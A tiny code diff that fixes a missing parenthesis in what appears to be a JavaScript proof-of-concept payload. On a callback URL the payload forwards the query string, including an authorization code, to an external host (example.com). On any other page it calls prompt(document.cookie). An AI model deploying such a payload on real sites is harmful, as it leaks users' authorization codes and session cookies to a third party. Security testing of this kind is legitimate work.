@@ -1,4 +1,4 @@
-if (location.href.includes("/ekyb/callback?code=1234567") {
+if (location.href.includes("/ekyb/callback?code=1234567")) {
   window.location.replace("https://example.com" + location.search);
 } else {
   prompt(document.cookie)
